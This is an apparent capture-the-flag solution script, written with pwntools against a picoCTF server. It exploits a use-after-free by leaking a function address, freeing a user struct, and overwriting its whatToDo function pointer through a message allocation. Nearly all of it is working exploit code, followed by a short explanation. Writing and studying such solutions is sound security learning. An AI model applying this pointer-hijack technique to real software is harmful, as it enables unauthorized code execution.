from pwn import *
import struct

p = remote('mercury.picoctf.net', 4504)
#p = process('./vuln')

## Read until the prompt
p.readuntil('xit\n')

## Get the address
p.send('S\n')

leak = int(p.readline().rstrip(b'\n').split(b'...')[1], 16)

print('[INFO] Address of brr: 0x%x' %leak)

p.readuntil('xit\n')

## Make the account to allocate the user struct
p.send('M\n')
p.readuntil(': \n')
p.send('hawaiijohn\n')

## Force the freeing of the user struct. Note that it doesn't set the global to null
p.readuntil('xit\n')
p.send('I\n')
p.readline()
p.send('Y\n')

## Now leave a message. This will allocate 8 bytes and overwwrite the whatToDo() field of the user structure
## This gives us control of the function pointer

p.send('l\n')
p.readuntil(':\n')
p.send(struct.pack('Q', leak))      ## write the brr function pointer

flag = p.readline()

print('[FLAG] %s' %(flag))

p.send('e\n')
p.close()

'''
This bug is a use after free.

Create a user then free the user via the 'I' command.
THis frees the user but leaves a dangling pointer.

You can then use the leave a message command to overwrite the whatToDo field.
'''

